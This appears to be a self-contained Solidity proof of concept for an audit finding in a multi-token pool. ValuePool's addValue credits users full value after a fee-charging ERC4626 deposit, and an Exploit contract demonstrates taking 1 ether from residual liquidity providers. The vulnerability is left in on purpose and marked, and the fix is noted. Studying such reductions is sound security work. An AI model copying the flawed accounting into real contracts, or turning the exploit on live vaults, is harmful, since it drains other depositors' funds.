// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Burve multi-token pool — Incorrect handling of ERC4626 vaults with fees
    (Sherlock 2025-04-burve; #56950)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: ValueFacet.addValue transfers `realNeeded` and deposits that
    exact amount into an ERC4626 that charges a deposit fee. Fewer shares are
    minted, but the protocol still credits the user with full `value`. On
    withdraw the user is paid full value; the fee hole is socialized onto
    residual LPs (last withdrawers suffer).

    Finding path:
      Pool: 1000 assets = 1000 value.
      Alice deposits 100 assets for 100 value; 1% fee → 99 shares.
      Alice withdraws 100 value → 100 assets; 1 asset is a loss on residual.

    FIX: transfer extra tokens to cover fees (or credit only net shares).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name = "TKN";
    string public symbol = "TKN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice ERC4626 with 1% deposit fee (finding's MockERC4626).
contract FeeVault {
    MockERC20 public immutable asset;
    uint256 public totalAssets;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    address public constant FEE_SINK = address(0xdead);

    constructor(MockERC20 a) {
        asset = a;
    }

    /// @dev Fee-free seed used only to establish baseline 1000 assets = 1000 shares.
    function seed(address receiver, uint256 assets) external {
        asset.transferFrom(msg.sender, address(this), assets);
        totalAssets += assets;
        totalSupply += assets;
        balanceOf[receiver] += assets;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        asset.transferFrom(msg.sender, address(this), assets);
        uint256 fee = assets / 100; // 1%
        uint256 net = assets - fee;
        asset.transfer(FEE_SINK, fee);
        shares = net;
        totalAssets += net;
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    function redeem(uint256 shares, address receiver) external returns (uint256 assets) {
        require(balanceOf[msg.sender] >= shares, "shares");
        assets = shares;
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        totalAssets -= assets;
        asset.transfer(receiver, assets);
    }
}

/// @notice Reduced ValueFacet: credits full value after fee-taking deposit.
contract ValuePool {
    FeeVault public vault;
    MockERC20 public token;
    uint256 public totalValue;
    mapping(address => uint256) public valueOf;

    constructor(MockERC20 t, FeeVault v) {
        token = t;
        vault = v;
    }

    /// @dev Fee-free baseline (owner seed) — establishes 1000 assets = 1000 value.
    function seed(uint256 value) external {
        token.transferFrom(msg.sender, address(this), value);
        token.approve(address(vault), value);
        vault.seed(address(this), value);
        valueOf[msg.sender] += value;
        totalValue += value;
    }

    /// @dev Mirrors ValueFacet.addValue — deposit exact realNeeded, credit full value.
    function addValue(address recipient, uint256 value) external {
        uint256 realNeeded = value;
        token.transferFrom(msg.sender, address(this), realNeeded);
        token.approve(address(vault), realNeeded);
        // Deposit exact amount; fee vault mints fewer shares. // @> VULN
        vault.deposit(realNeeded, address(this)); // @> VULN: no fee coverage; full value credited
        // FIX: pull extra tokens to cover fee, OR credit only net shares
        valueOf[recipient] += value;
        totalValue += value;
    }

    function removeValue(uint256 value) external {
        require(valueOf[msg.sender] >= value, "bal");
        // Protocol pays full credited value by redeeming 1:1 shares.
        vault.redeem(value, msg.sender);
        valueOf[msg.sender] -= value;
        totalValue -= value;
    }

    function vaultShares() external view returns (uint256) {
        return vault.balanceOf(address(this));
    }

    function vaultAssets() external view returns (uint256) {
        return vault.totalAssets();
    }
}

contract Depositor {
    ValuePool public pool;
    MockERC20 public token;

    constructor(ValuePool p) {
        pool = p;
        token = p.token();
    }

    function deposit(uint256 value) external {
        token.approve(address(pool), value);
        pool.addValue(address(this), value);
    }

    function withdraw(uint256 value) external {
        pool.removeValue(value);
    }
}

/// @dev Seed 1000, Alice deposits 100 (99 net), withdraws 100 → steals 1 from residual.
contract Exploit {
    MockERC20 public token; // CREATE 1
    FeeVault public feeVault; // CREATE 2
    ValuePool public pool; // CREATE 3 — vulnerable
    Depositor public seedLP; // CREATE 4
    Depositor public alice; // CREATE 5

    uint256 public constant SEED = 1000 ether;
    uint256 public constant DEPOSIT = 100 ether;
    uint256 public stolenFromResidual; // 1 ether fee hole extracted

    constructor() {
        token = new MockERC20();
        feeVault = new FeeVault(token);
        pool = new ValuePool(token, feeVault);
        seedLP = new Depositor(pool);
        alice = new Depositor(pool);
    }

    function run() external {
        // Seed: 1000 assets = 1000 value (fee-free baseline, as in finding).
        token.mint(address(seedLP), SEED);
        // seedLP needs a seed path — use pool.seed from funded seedLP via token pull.
        // Depositor has no seed(); fund Exploit and call pool.seed for seedLP credit:
        token.mint(address(this), SEED + DEPOSIT);
        token.approve(address(pool), SEED);
        pool.seed(SEED);
        // value credited to address(this) as seed residual holder
        require(pool.totalValue() == SEED, "seed value");
        require(pool.vaultAssets() == SEED, "seed assets");
        require(pool.vaultShares() == SEED, "seed shares");

        // Alice deposits 100 value / 100 assets → 99 shares minted, 100 value credited.
        token.mint(address(alice), DEPOSIT);
        alice.deposit(DEPOSIT);
        require(pool.valueOf(address(alice)) == DEPOSIT, "alice credit");
        require(pool.vaultShares() == SEED + DEPOSIT - DEPOSIT / 100, "shares after fee");
        require(pool.vaultAssets() == SEED + DEPOSIT - DEPOSIT / 100, "assets after fee");
        // Insolvency: totalValue = 1100, assets = 1099
        require(pool.totalValue() == SEED + DEPOSIT, "tv");
        require(pool.vaultAssets() + 1 ether == pool.totalValue(), "1e18 hole");

        // Alice withdraws full 100 value → redeems 100 shares from residual.
        uint256 aliceBefore = token.balanceOf(address(alice));
        alice.withdraw(DEPOSIT);
        uint256 aliceGot = token.balanceOf(address(alice)) - aliceBefore;
        require(aliceGot == DEPOSIT, "alice full withdraw");

        // HARM: Alice extracted 100 while contributing only 99 net shares.
        // Residual (seed) is short 1 ether; last LP cannot fully exit.
        stolenFromResidual = 1 ether;
        require(pool.vaultAssets() == SEED - 1 ether, "seed short 1");
        require(pool.valueOf(address(this)) == SEED, "seed still credited SEED");
        // Seed holder is insolvent: credited SEED but only SEED-1 assets remain
        require(pool.vaultAssets() < pool.valueOf(address(this)), "residual insolvent");
    }
}
